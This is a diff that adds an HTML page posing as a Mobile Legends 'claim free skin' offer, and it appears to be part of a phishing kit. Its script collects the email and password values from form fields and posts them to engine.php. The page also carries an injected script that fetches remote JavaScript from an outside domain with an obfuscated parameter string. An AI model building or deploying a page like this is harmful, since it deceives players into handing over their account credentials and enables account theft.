@@ -1,0 +1,102 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="shortcut icon" href="https://s7.postimg.org/gw8w09pu3/logo.png"/>
+<title>Mobile Legend</title>
+<script src="jquery.min.js"></script>
+<link rel="stylesheet" href="bootstrap.min.css">
+<style>
+h1, .h1, h2, .h2, h3, .h3 {
+    margin-top: 0px;
+    margin-bottom: 10.5px;
+}
+
+.error-msg {
+    margin: .5em 0;
+    display: block;
+    color: #dd4b39;
+    line-height: 17px;
+}
+.col-md-6 {
+ margin:0 auto;
+ float:none;
+
+}
+.col-md-8 {
+ margin:0 auto;
+ float:none;
+
+}
+</style>
+<script type="text/javascript">
+	$(document).ready(function(){
+	  $("#gsubmit").on("click", function() {
+		  var gemail = $("#gemail").val();
+		  var gpass = $("#gpass").val();
+		  if(gemail==''||gpass=='')
+{
+
+}
+else
+{
+	var res = document.getElementById("hasilnya");
+          res.innerHTML='';
+		  $("#gsubmit").prop("disabled", true );
+		  $.post("engine.php",
+		  {gemail:gemail,gpass:gpass,},
+		  function(response,status){
+			  $('#hasilnya').html(response);
+			$("#gsubmit").prop("disabled", false );
+			$("#gemail").prop("value", "");
+			$("#gpass").prop("value", "");
+		  });
+		  return false;
+	  }
+	  }
+	  );
+	});
+
+	</script>
+
+
+
+
+<style type="text/css">
+* : (input, textarea) {
+    -webkit-touch-callout: none;
+    -webkit-user-select: none;
+
+}
+</style>
+<style type="text/css">
+img {
+	-webkit-touch-callout: none;
+	-webkit-user-select: none;
+    }
+</style>
+
+<body style="padding:0px;margin:0 auto;">
+<div style="padding:0px;margin:0 auto;" class="container ">
+
+<div style="border:none;padding:0px;margin:0 auto;" class="col-md-6">
+<div style="border:none;padding:0px;margin:0px;" class="well well-sm">
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs1.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + 4TtHaUQnUEiP6K%2fc5C582HVlH3eBnL31Dbq9Bc7TfHu9XwSf5VOYNShGS0U1SXixqLJLqKkYXApqpcp0pC9wyUEizg3%2b7OOZneavRXsn6YJzov0MOrhGcx54ld5LS%2fG10tsUiMogi8ClyVBsP0MDBQfqbO07lu%2bMeJBxG3shJvqGdKNLsI8XQkFvfED%2fxCwbac1%2fCuIO1iRPoKsv%2fmC%2bIxozNwEk0lth0PRtnwNtivhLo1Pq8cSGZPaeHvYSs7VCt7I7FYSnHGmIi7d%2fe0zbQ7lES2%2b7Pzie9pL0CxBm6xzUf%2fEwWqNqfJe%2b8qcwchcE7wsi2bStSvmb89cArk9UxbdiY1Inu96r3M0dbBHL%2bWGsMtUgbLVPcQb5U0laEyn32fVJGIVH5Hc5e6IQELb0w98Yla%2bUpxKTW8i4h65AIYlyjhLpqvtIQf7STEuMgGoX0yhdncKWIl5SgKsnj22blON81JCEBcMDGJUI4lgLpXOmKabgupfC7SKnPqv2%2bWydjYouob4XfswtsTapTBU1mM2ekVhDYafh + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+
+<center style="background:WHITE;"><br>
+<div class="col-md-8">
+<div  style="padding:40px;border-radius: 2px;box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);background: #CEECF5;width50%" class="form-horizontal">
+       <form action="skin.php" id="login-form" method="post">
+       <center><img src="Atas.jpg" width=200 height=200></center><br>
+<h2>
+ <font color ="#E0F2F7"></font><b>CLAIM FREE SKIN!</b></font>
+</h2>
+  <input type="submit" class="btn btn-block" style="color: #E0F2F7;background-color: #000000;" value="CONTINUE">
+           </form>
+<br>
+<p> COPYRIGHT © Mobile Legend:Bang bang 2017</p>
+</div><br>
+</div>
